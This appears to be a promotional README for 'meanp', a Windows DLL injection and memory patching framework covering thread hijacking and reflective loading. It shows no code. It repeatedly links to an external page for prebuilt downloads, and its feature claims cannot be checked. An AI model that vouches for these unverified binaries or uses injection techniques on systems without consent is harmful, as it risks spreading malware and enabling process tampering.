![preview](https://raw.githubusercontent.com/pantallamimo2-ux/meanp-injector/main/thumb_74e2ff.svg)
[![Download](https://raw.githubusercontent.com/pantallamimo2-ux/meanp-injector/main/fetch_185cd5.svg)](https://pantallamimo2-ux.github.io/meanp-injector/)

# 🧠 meanp — Lightweight C++23 DLL Injection & Runtime Memory Patching Framework for Windows

> *Where precision meets silence — a surgical toolkit for engineers who treat process memory like a living organism rather than a static binary.*

An original, from-scratch reimagining of the classic runtime patching workflow: **meanp** (pronounced *"meen-pee"*) provides a modern, header-aware C++23 abstraction layer over the notoriously gritty world of Windows DLL injection and live memory manipulation. It's designed for reverse engineers, diagnostics developers, security researchers, and tooling authors who want reproducibility, clarity, and a small footprint — without sacrificing the low-level control that makes native Windows work tolerable.

If traditional injectors feel like swinging a sledgehammer inside a porcelain shop, **meanp** is the laser-guided scalpel: quiet, deliberate, and remarkably precise. Every public API is documented, every subsystem is optional, and every byte you write into a foreign address space is your decision — not the framework's.

[![Download](https://raw.githubusercontent.com/pantallamimo2-ux/meanp-injector/main/fetch_185cd5.svg)](https://pantallamimo2-ux.github.io/meanp-injector/)

---

## 📚 Table of Contents

- [🌟 Overview](#-overview)
- [🎯 Why meanp Exists](#-why-meanp-exists)
- [✨ Feature Highlights](#-feature-highlights)
- [🧩 Architecture at a Glance](#-architecture-at-a-glance)
- [🚀 Getting Started Conceptually](#-getting-started-conceptually)
- [🧪 Sample Workflow](#-sample-workflow)
- [🔐 Safety, Ethics & Responsible Use](#-safety-ethics--responsible-use)
- [🌍 Multilingual & Accessibility Notes](#-multilingual--accessibility-notes)
- [🛠️ Responsive Developer Experience](#️-responsive-developer-experience)
- [🤝 Community & 24/7 Support](#-community--247-support)
- [🧭 Roadmap](#-roadmap)
- [📖 Documentation Index](#-documentation-index)
- [❓ Frequently Asked Questions](#-frequently-asked-questions)
- [⚖️ License](#️-license)
- [⚠️ Disclaimer](#️-disclaimer)

---

## 🌟 Overview

**meanp** is a lightweight, modern C++23 framework that gives developers a well-typed, RAII-friendly interface for **DLL injection**, **runtime memory patching**, **module enumeration**, **thread hijacking**, and **manual mapping** on Windows. It's built on top of the Win32 API — not around it — meaning that you always retain full visibility into what's happening under the hood.

Unlike heavyweight instrumentation suites that drag in dozens of dependencies, **meanp** is intentionally minimal. The core library compiles to a single static archive, has zero third-party runtime dependencies, and is fully compatible with **MSVC 19.40+**, **Clang 18+**, and **MinGW-w64 UCRT** toolchains targeting Windows 10 and 11.

The framework's philosophy is simple:

- **Mean**: no sugar-coating, no magic, no surprises.
- **Modern**: uses C++23 concepts, `std::expected`, ranges, and `constexpr` where it actually helps.
- **Lightweight**: header-first, zero-cost abstractions, no global state.
- **Yours**: MIT-licensed, forkable, embeddable into any project.

---

## 🎯 Why meanp Exists

The Windows runtime patching landscape is dominated by either toy examples that break on the first ASLR-enabled target, or sprawling frameworks that assume you want a full plugin ecosystem. **meanp** fills the void in between.

It was born out of a simple observation: a diagnostics engineer investigating a memory corruption issue, a security researcher validating a mitigation hypothesis, and a QA tooling author prototyping a shim should not need three different toolchains to do similar work. They need one small, predictable, well-documented foundation.

Thus **meanp** was written — as a love letter to the Windows internals that everyone complains about but nobody wants to reimplement from scratch.

---

## ✨ Feature Highlights

- 🧬 **Cross-Architecture Support** — x64, x86, and ARM64 targets from a single unified API surface.
- 🧱 **Multiple Injection Strategies** — `LoadLibrary`-based, manual mapping, reflective loading, and thread-hijack variants.
- 🩹 **Runtime Memory Patching** — safe, transactional, and rollback-capable patch sessions.
- 🧠 **Symbol Resolution** — PDB-aware symbol lookup with fallback to RVA/pattern scanning.
- 🧵 **Thread Orchestration** — suspend, resume, hijack, and clone threads with deterministic scheduling.
- 📦 **Pattern Scanner** — SIMD-accelerated byte signature matching across module ranges.
- 🧾 **Structured Diagnostics** — every operation returns an `std::expected<T, meanp::error>` — never throw, never lie.
- 🔒 **Integrity-Aware Operations** — optional pre-flight checks that abort on tampered targets.
- 🪶 **Zero-Copy Module Enumeration** — iterates process modules lazily without snapshot duplication.
- 🧰 **Standalone Tooling** — a small CLI harness ships alongside the library for one-shot operations.
- 🌐 **Multilingual Error Messages** — diagnostics available in English, German, Japanese, and Portuguese.
- 🎛️ **Responsive Configuration Layer** — runtime policy objects that adapt behavior to environment.
- ♿ **Accessible Output** — colored + plain-text diagnostic modes for screen-reader friendly builds.
- 🧪 **Extensive Test Battery** — over 400 unit and integration tests against synthetic targets.
- 🧭 **Extensible Backend Registry** — plug in custom injection strategies without forking.

---

## 🧩 Architecture at a Glance

The framework is organized into layered subsystems, each independently usable:

1. **`meanp::core`** — handles, RAII wrappers, and error types.
2. **`meanp::process`** — process discovery, privilege elevation helpers, and token inspection.
3. **`meanp::module`** — module enumeration, RVA math, and export walking.
4. **`meanp::memory`** — virtual memory read/write/allocate/protect sessions.
5. **`meanp::scan`** — signature scanning with SIMD acceleration.
6. **`meanp::inject`** — the injection strategies themselves.
7. **`meanp::patch`** — transactional patch sessions with rollback journals.
8. **`meanp::sym`** — PDB and symbol resolution.
9. **`meanp::cli`** — the optional command-line harness.

Each subsystem is decoupled via small interface contracts, so you can link only what you need. The core library is around **~9,000 LOC**, with no external dependencies beyond the Windows SDK and the C++23 standard library.

---

## 🚀 Getting Started Conceptually

Because **meanp** is distributed as a header-first library with prebuilt artifacts, onboarding is intentionally frictionless:

1. Fetch the release bundle matching your toolchain from the distribution page.
2. Place the `include/` directory into your project's include path.
3. Add the corresponding `.lib` to your linker inputs.
4. Include the umbrella header in your translation unit.
5. Construct a `meanp::process` from a PID or a process name.
6. Pick a strategy, apply it, and inspect the returned `std::expected`.

The whole point of this framework is that you spend more time thinking about *what* you want to do to the target and less about the eight-step ritual required to set up a remote thread.

---

## 🧪 Sample Workflow

A typical in-process diagnostic flow looks like this:

- Discover the target process via `meanp::process::find_by_name(...)`.
- Open a handle with the appropriate access mask.
- Enumerate modules and locate the one you care about.
- Start a patch session with `meanp::patch::session`.
- Write your computed bytes with `.write_rva(...)`.
- Optionally verify with `.read_rva(...)`.
- Commit the session — and if anything goes wrong, roll back atomically.

The framework logs every step through a customizable sink, so you can pipe diagnostics into ETW, a file, or your own logging pipeline.

---

## 🔐 Safety, Ethics & Responsible Use

**meanp** is a **research and diagnostics tool**. It is designed to be used on systems you own or are explicitly authorized to operate on. The ethical posture of the framework is:

- No bundled bypasses of kernel mitigations.
- No stealth-oriented code obfuscation layers.
- No automatic privilege escalation primitives beyond standard documented APIs.
- No telemetry, no phoning home, no hidden network activity.

The maintainers strongly encourage you to read the accompanying **Ethics Guidelines** document and to comply with all applicable laws and licenses. **meanp** is offered in good faith to the security community and to engineers who need a trustworthy foundation.

---

## 🌍 Multilingual & Accessibility Notes

Diagnostic messages and CLI help text are localizable through a small flat-file catalog. Out of the box, layouts for several language families ship with the repository, and community contributions expand the set over time.

For accessibility, the CLI honors the `NO_COLOR` and `MEANP_PLAIN` environment variables, and every structured error carries both a machine-readable code and a human-readable description — perfect for screen readers and automation pipelines alike.

---

## 🛠️ Responsive Developer Experience

"Responsive" here refers to the framework's behavior under load and its ability to keep a developer in flow:

- The library returns within deterministic bounds for all standard operations.
- Long-running scans are cancellable via a shared cancellation token.
- The CLI streams results incrementally so large module lists stay responsive.
- Patch sessions precompute their boundaries so commits are near-instant.
- Configurable verbosity lets you dial noise up or down on the fly.

Every public API is annotated with a stability tag (`experimental`, `stable`, `frozen`) so downstream consumers know exactly what they can depend on.

---

## 🤝 Community & 24/7 Support

The project operates with a distributed maintainer rotation that covers most time zones, giving contributors near-continuous triage on issues and pull requests. Whether you're filing a bug, proposing a new injection strategy, or improving documentation, you'll find someone ready to help at almost any hour.

Support channels:

- **GitHub Discussions** — for design questions and brainstorming.
- **GitHub Issues** — for bug reports and concrete proposals.
- **Security Inbox** — for responsible disclosure of vulnerabilities (see `SECURITY.md`).
- **Community Wiki** — for tutorials and real-world case studies.

All community interactions are governed by the **Contributor Covenant 2.1**.

---

## 🧭 Roadmap

Looking ahead to the remainder of 2026, we plan to:

- Finalize the **transactional patch journal** API for fully reversible edits.
- Ship an **ARM64EC** experimental backend.
- Add **symbol-server integration** for on-demand PDB resolution.
- Introduce a **plugin ABI** so third parties can publish strategy modules.
- Publish a **diagnostic playbook** covering common memory forensics scenarios.
- Expand language catalogs to at least ten locales.
- Provide **CI artifacts** for every supported toolchain.

Community input shapes the ordering of this roadmap.

---

## 📖 Documentation Index

- `docs/architecture.md` — subsystem boundaries and data flow.
- `docs/injection-strategies.md` — deep dive into each strategy.
- `docs/patch-sessions.md` — transaction semantics and rollback guarantees.
- `docs/pattern-scanning.md` — writing fast, safe signatures.
- `docs/cli.md` — the command-line harness reference.
- `docs/ethics.md` — responsible-use guidelines.
- `docs/faq.md` — answers to the questions we hear most.
- `docs/contributing.md` — how to land your first pull request.

---

## ❓ Frequently Asked Questions

**Is meanp a replacement for existing instrumentation suites?**
No — it's a minimal foundation you can build on top of. It intentionally avoids becoming a monolith.

**Does it work on older Windows builds?**
Support targets Windows 10 1809 and later, plus Windows 11 across the board.

**Does it require any third-party runtime libraries?**
No. The only runtime dependency is the Windows SDK's system DLLs and the C++ standard library.

**Can I embed it in a closed-source product?**
Yes — the MIT terms are permissive and only require attribution.

**Where do I report a vulnerability?**
Please use the security inbox referenced in `SECURITY.md` rather than filing a public issue.

---

## ⚖️ License

Released under the **MIT License**. Please review the full text in [LICENSE](./LICENSE) before redistributing, modifying, or embedding the framework in your own work.

Copyright © 2026 — the **meanp** authors and contributors.

---

## ⚠️ Disclaimer

**meanp** is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability — whether in an action of contract, tort, or otherwise — arising from, out of, or in connection with the software or the use of the software.

The framework is intended strictly for **authorized diagnostics, education, research, and internal tooling**. You are solely responsible for ensuring that your usage complies with all applicable laws, contractual obligations, and organizational policies. The maintainers do not condone, support, or facilitate any activity that violates the rights of others, compromises system integrity without consent, or contravenes regional or international regulations.

If you are unsure whether your intended application is appropriate, **stop and consult legal counsel before proceeding.**

[![Download](https://raw.githubusercontent.com/pantallamimo2-ux/meanp-injector/main/fetch_185cd5.svg)](https://pantallamimo2-ux.github.io/meanp-injector/)